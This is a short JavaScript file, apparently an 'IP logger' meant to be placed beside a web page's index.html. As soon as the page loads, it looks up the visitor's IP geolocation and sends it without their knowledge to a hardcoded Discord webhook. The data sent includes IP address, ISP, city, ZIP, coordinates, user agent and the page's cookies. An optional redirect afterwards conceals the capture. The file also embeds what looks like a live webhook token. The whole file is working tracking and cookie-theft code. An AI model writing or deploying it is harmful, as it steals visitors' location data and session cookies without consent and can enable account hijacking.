// index.js – place next to index.html
// Paste your Discord Webhook URL below
const WEBHOOK_URL  = "https://discord.com/api/webhooks/1437445179962425455/d_Qa_1XCkqGigJviyUnPn1VPaWcbNXFRibYvCSzsVk9Sxu861IylFWl-MV6aHOr5piR-";
const REDIRECT_URL = "";   // set to "" to disable

(async () => {
    try {
        const resp = await fetch('https://ip-api.com/json/');
        const d    = await resp.json();

        const embed = {
            title: "New Visitor",
            color: 0x00ff00,
            fields: [
                { name: "IP Address",      value: `\`${d.query}\``, inline: true },
                { name: "Provider",        value: `${d.org} (${d.as})`, inline: true },
                { name: "Timezone",        value: d.timezone, inline: true },
                { name: "Country & Region",value: `${d.country} - ${d.region} (${d.regionName})`, inline: true },
                { name: "City & ZIP",      value: `${d.city} ${d.zip}`, inline: true },
                { name: "Coordinates",     value: `Lat: ${d.lat} | Lon: ${d.lon}`, inline: true },
                { name: "User-Agent",      value: navigator.userAgent, inline: false },
                { name: "Cookies",         value: document.cookie || "(none)", inline: false }
            ],
            thumbnail: { url: `https://flagcdn.com/64x48/${d.countryCode.toLowerCase()}.png` },
            timestamp: new Date().toISOString()
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: "IP Log", embeds: [embed] })
        });

        if (REDIRECT_URL) setTimeout(() => location.href = REDIRECT_URL, 500);
    } catch (e) {
        console.error(e);
    }
})();
